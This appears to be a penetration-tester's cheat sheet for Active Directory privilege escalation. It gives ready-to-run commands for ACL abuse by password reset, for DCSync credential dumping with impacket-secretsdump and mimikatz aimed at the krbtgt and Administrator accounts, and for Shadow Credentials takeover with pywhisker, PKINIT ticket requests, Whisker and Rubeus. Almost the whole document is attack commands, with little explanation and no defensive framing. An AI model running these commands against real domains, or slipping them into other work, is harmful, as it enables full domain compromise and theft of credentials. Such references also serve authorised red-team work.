# Privilege Escalation in AD

## ACL Abuse (BloodHound paths)
```bash
# GenericAll → change password
net user targetuser NewPassword123 /domain

# ForceChangePassword
# WriteOwner / WriteDacl → modify ACLs
```

## DCSync Attack
```bash
# Requires DA or Replication rights
impacket-secretsdump $DOMAIN/admin:pass@$DC_IP
impacket-secretsdump $DOMAIN/admin:pass@$DC_IP -just-dc
impacket-secretsdump $DOMAIN/admin:pass@$DC_IP -just-dc-user krbtgt

# With mimikatz
lsadump::dcsync /domain:$DOMAIN /user:krbtgt
lsadump::dcsync /domain:$DOMAIN /user:Administrator
```

## Shadow Credentials (msDS-KeyCredentialLink)
Requires `GenericAll`/`GenericWrite`/`WriteProperty` on target's msDS-KeyCredentialLink.

```bash
# Add shadow credential
pywhisker -d $DOMAIN -u $USER -p $PASSWORD -t "target_user" --action add --filename cert

# Get TGT via PKINIT
python3 gettgtpkinit.py $DOMAIN/target_user -cert-pfx cert.pfx -dc-ip $DC_IP target_user.ccache

# Use TGT (e.g., DCSync)
export KRB5CCNAME=target_user.ccache
impacket-secretsdump $DOMAIN/target_user@$DC_IP -k -no-pass -just-dc

# Windows alternative (Whisker + Rubeus)
Whisker.exe add /target:target_user /domain:$DOMAIN /dc:$DC_IP /path:cert.pfx
Rubeus.exe asktgt /user:target_user /certificate:cert.pfx /password:pass /domain:$DOMAIN /dc:$DC_IP
```
